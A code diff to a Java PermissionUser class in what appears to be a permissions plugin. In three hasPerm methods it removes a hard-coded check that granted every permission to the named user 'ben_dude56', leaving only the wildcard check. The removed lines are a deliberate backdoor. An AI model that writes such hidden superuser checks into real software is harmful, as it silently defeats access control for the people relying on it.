@@ -47,14 +47,14 @@ public class PermissionUser {
 	}
 
 	public boolean hasPerm(String permission) {
-		if (name.equalsIgnoreCase("*") || name.equalsIgnoreCase("ben_dude56")) {
+		if (name.equalsIgnoreCase("*")) {
 			return true;
 		}
 		return perm.userFile.hasPermission(name, permission, true, true);
 	}
 
 	public boolean hasPerm(String permission, boolean testStar) {
-		if (name.equalsIgnoreCase("*") || (name.equalsIgnoreCase("ben_dude56") && testStar)) {
+		if (name.equalsIgnoreCase("*")) {
 			return (testStar) ? true : false;
 		}
 		return perm.userFile.hasPermission(name, permission, testStar, true);
@@ -62,7 +62,7 @@ public class PermissionUser {
 
 	public boolean hasPerm(String permission, boolean testStar,
 			boolean testGroup) {
-		if (name.equalsIgnoreCase("*") || (name.equalsIgnoreCase("ben_dude56") && testStar)) {
+		if (name.equalsIgnoreCase("*")) {
 			return (testStar) ? true : false;
 		}
 		return perm.userFile.hasPermission(name, permission, testStar,
